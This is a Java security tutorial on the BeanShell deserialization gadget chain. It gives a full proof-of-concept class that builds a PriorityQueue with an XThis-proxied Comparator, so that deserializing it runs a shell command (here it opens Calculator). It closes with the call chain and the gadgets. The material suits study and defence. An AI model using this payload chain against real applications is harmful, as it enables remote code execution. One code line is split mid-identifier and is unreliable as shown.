# Java Security Learning—BeanShell Chain

Author: H3rmesk1t

Data: 2022.03.16

# BeanShell Introduction
[BeanShell](https://en.wikipedia.org/wiki/BeanShell) is a small, free, embedded Java source interpreter with object scripting language features, written in Java. It runs in the Java Runtime Environment (JRE), dynamically executes standard Java syntax and extends it with common scripting conveniences such as loose types, commands, and method closings, like those in Perl and JavaScript.

# Pre-knowledge
## Interpreter
`bsh.Interpreter` is an interpreter that interprets and executes the `BeanShell` script. You can set variables through the `set` method, and then interpret and execute scripts through the `eval` method. The parsed and set variables will be saved in the member variable globalNameSpace of the `Interpreter` instance. `bsh.NameSpace` is a namespace that stores methods, variables, and packages. `NameSpace` and an `Interpreter` instance form the context of a `Bsh` script object.

<div align=center><img src="./images/1.png"></div>

<div align=center><img src="./images/2.png"></div>

## XThis
`bsh.This` is the `Bsh` script object type. A `This` object is the context of an object of a `Bsh` script. A `This` object stores `NameSpace` and `Interpreter`, and provides some methods for manipulating the content in the context.

<div align=center><img src="./images/3.png"></div>

Where the `invokeMethod` method provides the function of calling methods from outside the `Bsh` script using `Java` code.

`XThis` is a subclass of the `bsh.This` object. On the basis of `This`, the support of the general interface proxy mechanism is added, that is, `InvocationHandler`. There is an internal class `Handler` in `XThis`, which implements the `InvocationHandler` interface and overrides the `invoke` method, and calls the `invokeImpl` method. The `invokeImpl` method specially handles the `equals` and `toString` methods, call `invokeMethod` to execute the corresponding methods, and uses `Primitive.unwrap` to process the return value.

<div align=center><img src="./images/4.png"></div>

In general, `XThis` is a proxy class for an object of a `Bsh` script. The method of the `Bsh` script can be called externally through this proxy class.

# POC
```java
package org.h3rmesk1t.BeanShell;

import bsh.Interpreter;
import bsh.XThis;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.Base64;
import java.util.Comparator;
import java.util.PriorityQueue;

/**
 * @Author: H3rmesk1t
 * @Data: 2022/3/16 12:11 am
 */
public class BeanShellExploit {

    public static String serialize(Object obj) throws Exception {

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(obj);
        byte[] expCode = byteArrayOutputStream.toByteArray();
        objectOutputStream.close();
        return Base64.getEncoder().encodeToString(expCode);
    }

    public static void unserialize(String expBase64) throws Exception {

        byte[] bytes = Base64.getDecoder().decode(expBase64);
        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes);
        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
        objectInputStream.readObject();
    }
    
    public static void main(String[] args) throws Exception {

        // The compare function needs to accept two parameters and return the Integer type.
        String func = "compare(Object whatever,Object dontCare) {java.lang.Runtime.getRuntime().exec(\"open -a Calculator\");return new Integer(1);}";

        // Register the compare method into the Interpreter instance context.
        Interpreter interpreter = new Interpreter();
        interpreter.eval(func);

        // Create an XThis object and get its invocationHandler.
        XThis xThis = new XThis(interpreter.getNameSpace(), interpreter);
        Field handlerField = XThis.class.getDeclaredField("invocationHandler");
        handlerField.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) handlerField.get(xThis);

        // Create dynamic proxy for Comparator using XThis$Handler
        Comparator<Object> comparator = (Comparator<Object>) Proxy.newProxyInstance(Comparator.class.getClassLoader(), new Class<?>[]{Comparator.class}, handler);

        PriorityQueue<Object> queue = new PriorityQueue<>(2);
        queue.add("1");
        queue.add("2");

        Field field = Class.forName("java.util.PriorityQueue").getDeclaredField("comparator");
        field.setAccessible(true);
        field.set(queue, comparator);

        // Serialization operation.
        String ex
p = serialize(queue);
        System.out.println(exp);

        // Deserialization operation.
        unserialize(exp);
    }
}
```

# Call chain
```java
PriorityQueue.readObject()
    Comparator.compare()
            XThis$Handler.invoke()
                XThis$Handler.invokeImpl()
                    This.invokeMethod()
                        BshMethod.invoke()
```

# Summarize
## Usage Instructions
Use the `PriorityQueue` deserialization of the `compare` method that triggers the `Comparator`, use the `XThis$Handler` dynamic proxying the `Comparator` and constructing a `compare` method with malicious code within its `Interpreter` trigger call.

## Gadget
 - kick-off gadget: java.util.PriorityQueue#readObject
 - sink gadget: bsh.This#invokeMethod
 - chain gadget: bsh.XThis$Handler#invokeImpl
 - Supplement: In fact, `XThis` can be used to implement any `kick-off` trigger, because any method can be executed using a dynamic proxy.

# refer to
 - [BeanShell](https://su18.org/post/ysoserial-su18-5/#:~:text=rome%20%3A%201.0-,BeanShell,-BeanShell%20%E6%98%AF%E4%B8%80%E4%B8%AA)